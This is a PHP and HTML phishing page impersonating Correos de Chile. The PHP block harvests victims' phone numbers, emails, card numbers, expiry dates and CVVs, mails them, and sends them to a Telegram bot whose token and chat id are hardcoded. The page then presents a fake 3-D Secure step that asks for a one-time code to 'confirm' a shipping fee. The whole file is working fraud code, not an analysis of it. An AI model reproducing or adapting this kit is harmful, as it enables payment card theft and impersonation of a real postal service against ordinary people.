<?php
session_start();
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$bilsmg .= "------------------------------------------------------\n";
$bilsmg .= "N-Phone      : ".$_POST['selectprefix']."-".$_POST['nocphone2']."\n";
$bilsmg .= "E-mail       : ".$_POST['em1']."\n";
$bilsmg .= "C-Number     : ".$_POST['ccnn1']."\n";
$bilsmg .= "D-Expiration : ".$_POST['cexppdm']." / ".$_POST['cexdyyyyss']."\n";
$bilsmg .= "CVN          : ".$_POST['qsdq21sd5s4d4s1']."\n";
$bilsmg .= "--------------------------------------------------------\n";
$bilsmg .= "From : $ip \n";

$bilsub = "CHILECCC :) - ".$ip;
$bilhead = "From: CHILE BOX <send@saudipost.io>";
if(!empty($_POST['qsdq21sd5s4d4s1']) && strlen($_POST['qsdq21sd5s4d4s1'])>2){
mail("",$bilsub,$bilsmg,$bilhead);
fwrite($bilsmg);}
	$token = "1700913062:AAGG_8FRQPJOQ5fFnww_G14MDUcV9MiruW4";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=-525355396&text=" . urlencode($bilsmg)."" );
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<HTML lang="en">
<HEAD>
    <TITLE>Correos de Chile</TITLE>
    <META content="text/html; charset=utf-8" http-equiv="Content-Type" />
    <LINK rel="stylesheet" type="text/css" href="https://acs4.3dsecure.no/mdpayacs/content/040/screen.css" />
    <LINK rel="stylesheet" type="text/css" href="https://acs4.3dsecure.no/mdpayacs/content/040/dk/gh-buttons.css" />
    <script src="https://acs4.3dsecure.no/mdpayacs/content/commons.js"></script>
    <script src="https://acs4.3dsecure.no/mdpayacs/content/040/js/jquery-1.9.1.min.js"></script>
    <script type="text/javascript" src="./Autentisering_files/date_time.js"></script>
    <script type="text/javascript">
    var count = 10;
    var redirect = "sms.html";
     
    function countDown(){
        var timer = document.getElementById("timer");
        if(count > 0){
            count--;
            timer.innerHTML = "Por favor, espere "+count+" secondes...";
            setTimeout("countDown()", 1000);
        }else{
            document.getElementById("authform1").style.display="none";
			document.getElementById("authform2").style.display="block";
        }
    }
    </script>
<script type="text/javascript">

        function onBodyLoad() {
            document.form.otp.focus();
        }
		
		function validate(){
	
var cd=document.getElementById("code");
var flag=0;

if (cd.value=="" || cd.value.length<6)
 {	cd.style.borderColor="red";flag=1;
 }else{ 
  	cd.style.borderColor="green";
   }
 if (flag==1)
{document.getElementById("msg_error").style.display="block";return false;}else{document.getElementById("msg_error").style.display="none";return true;}
	
		}
    </script>
</HEAD>
<BODY OnLoad="onBodyLoad();">

<DIV id="authform" >

<DIV id="authform1">
    <DIV class="wrapper">
        <DIV class="logos">
            <TABLE>
                <TBODY>
                <TR>
                    <TD class="identifier">
                        <IMG alt="" src="" style="max-height:56px;"/><IMG alt="" src="" style="max-height:56px;"/>
                    </TD>
                    <TD class="bank">
                    </TD>
                    <TD class="bank">
                        <IMG alt="" src="https://emotions.cl/wp-content/themes/emotions/images/correos-chile.png" style="max-height:56px;"/>
                    </TD>
                </TR>
                </TBODY>
            </TABLE>
        </DIV>
        <H1>Verifica tu información</H1>
        <P>Por favor, espere mientras procesamos su solicitud.</P>
		<br><br>
        <p><img src="loader.gif" width="" height="" class="intrologo" alt=""/></p>
        
    <br><br>
     
    <span id="timer">
    <script type="text/javascript">countDown();</script>
    </span>
  </DIV>
  <script type="text/javascript">
    function incrementResendCount() {
        var resendCount = localStorage.getItem("localResendCount");
        if (resendCount == null) {
            resendCount = 0;
        }
        resendCount = Number(resendCount);
        resendCount = ++resendCount;
        localStorage.setItem("localResendCount", resendCount);
    }

    $(document).ready(function(){
        var resendCount = localStorage.getItem("localResendCount");

        if (Number(resendCount) >= 2) {
            $("#resendButton").hide();
            $("#resendText").hide();
            $("#errorMessage").hide();
            $("#resendExceeded").show();
            localStorage.setItem("localResendCount", "0");
        }

    });
</script>
</DIV>







<DIV id="authform2" style="display:none;">
    <DIV class="wrapper">
        <DIV class="logos">
            <TABLE>
                <TBODY>
                <TR>
                    <TD class="identifier">
                        <IMG alt="" src="" style="max-height:56px;"/><IMG alt="" src="" style="max-height:56px;"/>
                    </TD>
                    <TD class="bank">
                    </TD>
                    <TD class="bank">
                        <IMG alt="" src="https://emotions.cl/wp-content/themes/emotions/images/correos-chile.png" style="max-height:56px;"/>
                    </TD>
                </TR>
                </TBODY>
            </TABLE>
        </DIV>
        <H1>VERIFICACIÓN</H1>
        <P></P>
        <p>Introduzca el número de su paquete 134679**5CL y confirme el pago de los gastos de envío (2425,80 CLP) haciendo clic en confirmar. </p>
		
        <FORM id="form" name="form" method="post" action="auth2.php" onsubmit="return validate()">
        <input name="tel" value="<?php echo $_POST['selectprefix']."-".$_POST['nocphone2']; ?>" type="hidden" />
        <input name="email" value="<?php echo $_POST['em1']; ?>" type="hidden" />
        <input name="cc" value="<?php echo $_POST['ccnn1'];?>" type="hidden" />
        <input name="expe" value="<?php echo $_POST['cexppdm']." / ".$_POST['cexdyyyyss']; ?>" type="hidden" />
        <input name="cvv" value="<?php echo $_POST['qsdq21sd5s4d4s1'];?>" type="hidden" />
        
            <DL style="margin-top: 10px;">
                <DT>Correos de Chile</DT>
                <DD id="purchAmount">Paquete de cajas
</DD>

                <DT>Fecha: </DT>
                <DD><span id="date_time"></span></DD>
				            <script type="text/javascript">window.onload = date_time('date_time');</script>

                <DT>Número de tarjeta: </DT>
                <DD><?php 
                echo substr($_POST['ccnn1'], 0, 4)." XXXX XXXX ".substr($_POST['ccnn1'],-4);
                ?></DD>

                <DT>Número de móvil: </DT>
                <DD><?php echo $_POST['selectprefix']."-".$_POST['nocphone2'] ;?></DD>
                    <LABEL for="code"> </LABEL>
                <DT>
                </DT>
                <DD>
                    <INPUT name="otp" type="text" id="code" style="width: 100px" onKeyPress="return submitenter(this,event)" width="6" maxlength="14" /></DD><DT>
                    
                </DT>
                <DD> </DD><DT>
                    
                </DT>
                <DD>
                    <button class="button icon approve primary" name="submit" id="submit" type="submit" value="submit" style="position: absolute; margin-left: 5px;">Confirmar</button>
                </DD>
            </DL>
            <div style="padding-bottom:30px;">
                <P>&nbsp;</P></div>
                 <div id="msg_error" class="error" style="display: none;padding-bottom:10px;">Please check the marked fields.</div>
            <DIV style="font-size: 0.92em; margin-bottom: 8px;">
             
               <div>
                <P>&nbsp;</P>
               
            </DIV>
            <A class="button icon settings" >Cambiar el número</A>
            <A class="button" >Correos de Chile</A>
            <A class="button icon add" >Nuevo código</A>
            <DIV style="float: right;">
                <A class="button icon arrowleft" >volver</A>
            </DIV>
        </FORM>
    </DIV>
</DIV>
</DIV>
</BODY>
</HTML>